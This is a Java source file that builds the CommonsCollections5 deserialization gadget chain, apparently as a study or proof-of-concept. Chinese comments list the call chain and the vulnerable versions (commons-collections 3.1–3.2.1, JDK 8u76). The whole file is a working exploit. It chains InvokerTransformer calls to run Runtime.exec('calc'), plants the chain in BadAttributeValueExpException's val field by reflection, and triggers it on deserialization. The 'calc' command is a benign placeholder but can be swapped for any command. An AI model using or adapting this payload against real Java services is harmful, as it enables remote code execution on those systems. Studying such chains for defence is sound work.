import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


import static util.Util.serialize;
import static util.Util.unserialize;

/*调用链：
BadAttributeValueExpException.readObject()
   TiedMapEntry.toString()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                    InvokerTransformer.transform()
* */
/*版本依赖:
commons-collections : 3.1～3.2.1
jdk 8u76 without a security manager
* */
public class CommonsCollections5 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(),chainedTransformer);
        TiedMapEntry tiedMapEntry =new TiedMapEntry(lazyMap,"dragonkeep");

        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("dragonkeep");
        Field field=BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        serialize(badAttributeValueExpException);
        unserialize();

    }
}
